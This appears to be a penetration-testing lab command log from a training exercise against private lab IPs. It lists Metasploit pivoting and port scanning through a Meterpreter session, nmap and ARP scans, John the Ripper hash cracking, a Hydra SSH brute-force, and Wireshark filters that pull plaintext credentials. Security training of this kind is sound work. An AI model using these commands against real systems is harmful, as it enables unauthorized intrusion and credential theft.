@@ -1,0 +1,69 @@
+================================================================================
+          LAB COMMANDS LOG - APPLIED PENETRATION TESTING ENGINEER
+================================================================================
+Host Machine IP (Kali Linux) : 192.168.129.128
+Target 1 Machine IP (Windows): 192.168.129.132
+Target 2 Machine IP (Ubuntu) : 192.168.129.129
+--------------------------------------------------------------------------------
+
+[SCENARIO 1: METASPLOIT PORT SCANNING & PIVOTING]
+
+1. View active compromise sessions to identify the target pivot host:
+   msf6 > sessions
+
+2. Add a static network route using Meterpreter Session 11 to reach Target 2's internal subnet:
+   msf6 > route add 192.168.129.0 255.255.255.0 11
+
+3. Verify that the route was successfully registered in the Metasploit routing table:
+   msf6 > route print
+
+4. Search for the required internal TCP port scanning module:
+   msf6 > search portscan/tcp
+
+5. Load the portscan module, configure the internal host, and execute the scan:
+   msf6 > use auxiliary/scanner/portscan/tcp
+   msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS 192.168.129.129
+   msf6 auxiliary(scanner/portscan/tcp) > run
+
+
+--------------------------------------------------------------------------------
+[SCENARIO 2: LEGACY SERVER COMPROMISE & SSH BRUTE-FORCING]
+
+1. Discover internal network hosts alive on the subnet using ARP scanning:
+   $ sudo arp-scan 192.168.129.0/24
+
+2. Audit Target 2 (Ubuntu) to verify open services (FTP, SSH, HTTP):
+   $ nmap -sV 192.168.129.129
+
+3. Execute John the Ripper to crack leaked password hashes:
+   $ john hashes.txt
+
+4. Display successfully cracked passwords from the completed session database:
+   $ john --show hashes.txt
+
+5. Create local targeted user lists and password lists via terminal:
+   $ nano user.txt
+   $ nano pass.txt
+
+6. Launch a multi-threaded, stealthy SSH brute-force attack against Target 2 using Hydra (4 tasks):
+   $ hydra -L user.txt -P pass.txt -t 4 ssh://192.168.129.129
+
+
+--------------------------------------------------------------------------------
+[SCENARIO 3: NETWORK ANALYSIS & PACKET CAPTURE VIA WIRESHARK]
+
+1. Wireshark display filter to isolate unencrypted credentials submitted via HTTP forms:
+   http.request.method == "POST"
+
+2. Alternative specific text string match filter to isolate plaintext authentication:
+   http contains "password" || http contains "username"
+
+3. Display filter to isolate network-wide Address Resolution Protocol (ARP) captures:
+   arp
+
+4. Filter to locate File Transfer Protocol (FTP) command sessions:
+   ftp
+
+5. Graphical inspection analysis technique for continuous stream reading:
+   Action: Right-Click Packet -> Follow -> TCP Stream (or HTTP Stream)
+================================================================================
